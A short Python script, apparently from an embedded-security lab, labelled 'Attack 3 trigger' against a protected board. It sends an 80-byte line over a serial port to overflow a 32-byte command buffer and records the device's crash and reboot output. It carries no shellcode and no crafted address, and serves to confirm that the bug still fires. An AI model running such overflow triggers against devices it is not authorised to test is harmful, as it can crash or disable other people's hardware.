# Attack 3 trigger (protected board): send one oversized line so it arrives
# as a single write and overflows the 32-byte command buffer. No crafted
# address / no shellcode -- just bulk input to show the bug still fires.
import serial, time, sys

PORT = "COM4"
s = serial.Serial(PORT, 115200, timeout=0.3)
time.sleep(0.4)
s.reset_input_buffer()

payload = b"A" * 80 + b"\r\n"       # 80 bytes into a 32-byte buffer
print(f"[*] sending {len(payload)-2} 'A' bytes in one write to {PORT} ...")
s.write(payload)
s.flush()

buf = b""
t0 = time.time()
while time.time() - t0 < 5:          # capture ~5s of device output (crash + reboot)
    chunk = s.read(1024)
    if chunk:
        buf += chunk
s.close()

sys.stdout.buffer.write(b"\n----- device output -----\n")
sys.stdout.buffer.write(buf)
sys.stdout.buffer.write(b"\n----- end -----\n")
